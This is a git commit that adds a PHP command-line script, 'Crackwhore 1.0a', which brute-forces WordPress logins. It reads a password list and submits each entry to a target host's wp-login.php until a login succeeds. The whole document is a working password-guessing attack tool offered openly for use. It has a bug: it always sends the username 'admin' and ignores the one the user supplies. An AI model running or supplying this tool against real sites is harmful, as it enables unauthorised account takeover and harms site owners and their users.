c438c09522d338f1aaac6ddb0ceff49f7eea7548
Michael Scott Hertzberg <mshertzberg@gmail.com>
2011-12-10 14:55:30 -0500

    add 0.1 alpha files

---
+++ crack.php
@@ -0,0 +1,55 @@
+#!/usr/bin/php
+<?php
+	require_once 'libs/goutte.phar';
+
+	date_default_timezone_set( @date_default_timezone_get() );
+
+	$passwords = array();
+
+	if( ! isset( $_ENV["_"] ) )
+		die( 'This is for CLI only. Sorry bub.' );
+
+	$opts = getopt( 'u:P:h:' );
+
+	$username  = $opts['u'];
+	$passwords = $opts['P'];
+	$host      = $opts['h'];
+	
+	if( empty( $username) && empty( $passwords ) && empty( $host ) ) {
+		printf( "Crackwhore 1.0a\n\n" );
+		printf( "-h\thost (ex. www.loserville.com)\n" );
+		printf( "-u\tusername (ex. admin)\n");
+		printf( "-P\tpassword file (ex. pass.txt)\n\n");
+		return;
+	}
+
+	use Goutte\Client;
+	$client = new Client( array( 'useragent' => 'Crackwhore/1.0a' ) );
+
+	$crawler = $client->request( 'POST', 'http://' . $host . '/wp-login.php' );
+	$form    = $crawler->selectButton( 'Log In' )->form();
+	
+	$passes  = file( $passwords, FILE_SKIP_EMPTY_LINES );
+
+	printf( "[+] attack initiated against '%s' using username '%s' at http://%s/wp-login.php...\n", $crawler->filter( '#login h1 a' )->text(), $username, $host );
+	printf( "[+] reading file %s...\n", $passwords );
+	printf( "[+] we have %d passwords...\n", count( $passes ) );
+
+	foreach( $passes as $password ) {	
+		$crawler = $client->submit( $form, array( 'log' => 'admin', 'pwd' => $password ) );
+		
+		try {
+			$nodes = $crawler->filter( '#login_error' )->text();
+			$error = true;
+		} catch( Exception $e ) {
+			$error = false;
+		}
+
+		if( $error ) {
+			printf( "[?] %s:%s ...\n", $username, trim( $password ) );
+		} else {
+			printf( "[!] SUCCESS! The winning combo is %s:%s\n", $username, $password );
+			return;
+		}
+	}
+?>
